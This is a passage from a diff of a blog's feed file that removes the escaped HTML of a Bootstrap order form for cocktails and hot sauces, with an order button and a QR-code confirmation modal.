-                  &lt;div class="col-lg-2"&gt;
-                    &lt;input type="checkbox" id="chkNegroni"&gt;
-                  &lt;/div&gt;
-                  &lt;div class="col-lg-10"&gt;
-                    &lt;label for="chkNegroni"&gt;Mezcal Negroni&lt;/label&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;
-            &lt;div class="col-sm"&gt;
-              &lt;div class="container"&gt;
-                &lt;div class="row"&gt;
-                  &lt;div class="col-lg-2"&gt;
-                    &lt;input type="checkbox" id="chkSurprise"&gt;
-                  &lt;/div&gt;
-                  &lt;div class="col-lg-10"&gt;
-                    &lt;label for="chkSurprise"&gt;Sous Chef's Surprise Cocktail&lt;/label&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;
-          &lt;/div&gt;
-        &lt;/div&gt;
-      &lt;/div&gt;
-    &lt;/div&gt;
-  &lt;/div&gt;
-  &lt;div class="card"&gt;
-    &lt;div class="card-header" id="headingFour"&gt;
-      &lt;h5 class="mb-0"&gt;
-        &lt;button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseFour" aria-expanded="false" aria-controls="collapseFour"&gt;
-          Other Stuff
-        &lt;/button&gt;
-      &lt;/h5&gt;
-    &lt;/div&gt;
-    &lt;div id="collapseFour" class="collapse" aria-labelledby="headingFour" data-parent="#accordion"&gt;
-      &lt;div class="card-body"&gt;
-        &lt;div class="container"&gt;
-          &lt;div class="row"&gt;
-            &lt;div class="col-sm"&gt;
-              &lt;div class="container"&gt;
-                &lt;div class="row"&gt;
-                  &lt;div class="col-lg-2"&gt;
-                    &lt;input type="checkbox" id="chkUgly"&gt;
-                  &lt;/div&gt;
-                  &lt;div class="col-lg-10"&gt;
-                    &lt;label for="chkUgly"&gt;&lt;a href="https://untp.beer/zBrr3" target="_blank"&gt;Crazy Bastard Carolina Reaper &amp;amp; Blueberry Sauce&lt;/a&gt;&lt;/label&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;
-            &lt;div class="col-sm"&gt;
-              &lt;div class="container"&gt;
-                &lt;div class="row"&gt;
-                  &lt;div class="col-lg-2"&gt;
-                    &lt;input type="checkbox" id="chkSamourai"&gt;
-                  &lt;/div&gt;
-                  &lt;div class="col-lg-10"&gt;
-                    &lt;label for="chkSamourai"&gt;Samourai Sauce&lt;/label&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;
-            &lt;div class="col-sm"&gt;
-            &lt;/div&gt;
-          &lt;/div&gt;
-        &lt;/div&gt;
-      &lt;/div&gt;
-    &lt;/div&gt;
-  &lt;/div&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;div&gt;
-&lt;div&gt;
-&lt;p&gt;All toppings subject to availability, for special requests contact me on Instagram&lt;/p&gt;
-&lt;/div&gt;
-  &lt;button id="btnSubmit" type="button" class="btn btn-primary" data-toggle="modal" data-target="#exampleModal" data-whatever="@getbootstrap"&gt;Order&lt;/button&gt;
-&lt;/div&gt;
-&lt;div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true"&gt;
-  &lt;div class="modal-dialog" role="document"&gt;
-    &lt;div class="modal-content"&gt;
-      &lt;div class="modal-header"&gt;
-        &lt;h5 class="modal-title" id="exampleModalLabel"&gt;Order Confirmation&lt;/h5&gt;
-        &lt;button type="button" class="close" data-dismiss="modal" aria-label="Close"&gt;
-          &lt;span aria-hidden="true"&gt;×&lt;/span&gt;
-        &lt;/button&gt;
-      &lt;/div&gt;
-      &lt;div class="modal-body"&gt;
-      &lt;h4&gt;Your QR code for entry&lt;/h4&gt;
-      &lt;p&gt;The QR code contains your order&lt;/p&gt;
-      &lt;p&gt;You can also see your order confirmation &lt;a href="https://blog.mark-burton.com/mywyamblog/qr"&gt;here&lt;/a&gt;
-        &lt;img src="https://blog.mark-burton.com/assets/Images/qr-code-hw.png" class="img-fluid"&gt;
-      &lt;/p&gt;&lt;/div&gt;
-      &lt;div class="modal-footer"&gt;
-      &lt;/div&gt;
-    &lt;/div&gt;
-  &lt;/div&gt;
-&lt;/div&gt;
-&lt;/div&gt;</content>
-		<summary>&lt;p&gt;All toppings subject to availability, for special requests contact me on Instagram&lt;/p&gt;</summary>
 	</entry>
 </feed>
